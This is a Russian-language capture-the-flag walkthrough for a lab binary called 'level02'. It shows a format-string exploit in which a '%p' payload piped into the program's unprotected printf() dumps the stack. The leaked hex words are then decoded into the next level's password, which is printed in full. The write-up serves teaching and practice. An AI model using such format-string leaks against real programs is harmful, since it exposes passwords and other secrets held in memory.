>ls -la
>./level02

Программа ждет логин и пароль с помощью fgets.

> gdb ./level02
После дизассемблирования мы видим, что до появления этих подсказок процесс открывается 
и сохраняет содержимое /home/users/level03/.pass в буфер на стеке и ничего с ним не делает.
У нас есть первый буфер, который позже используется для хранения логина.
У нас есть второй буфер, в котором будет храниться собственно пароль
У нас есть третий буфер для введенного пользователем пароля

Кроме того, содержимое приглашения имени пользователя отображается на экране с незащищенным вызовом printf()! 
Это означает, что если мы включим модификаторы %p или %x со спецификаторами параметров x$, 
мы сможем напечатать что угодно в стеке, включая копию флага 

python -c "print '%p ' * 500" | ./level02
Получим:
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe500 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 
0x7fffffffe6f8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520
 0x2070252070252070 0x7025207025207025 0x2520702520702520 
 0x2070252070252070 0x7025207025207025 0x2520702520702520
  0x2070252070252070 0x7025207025207025 0x2520702520702520
   0x2070252070252070 0x100207025 (nil) 0x756e505234376848
    0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873
     0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 
     0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  
     does not have access!

Проходимся по всем указателям и видим, 
что есть данные по указателям от второго до третьего (nil):
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d

Теперь преобразуем полученный результат в удобочитаемый вид ASCII через script.sh, 
используя утилиту xxd с флагом -r,
соединим части и получим пароль:
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

